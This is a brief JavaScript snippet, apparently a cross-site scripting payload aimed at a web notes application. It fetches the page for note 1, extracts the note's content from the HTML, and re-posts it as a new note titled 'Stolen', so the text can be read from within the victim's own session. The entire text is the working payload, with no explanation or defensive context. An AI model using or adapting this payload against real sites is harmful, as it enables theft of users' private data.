fetch('/notes/1').then(r=>r.text()).then(d=>{
  let parser = new DOMParser();
  let doc = parser.parseFromString(d, 'text/html');
  let content = doc.querySelector('div.mt-6').innerHTML;
  fetch('/notes',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'title=Stolen&content='+encodeURIComponent(content)
  })
})
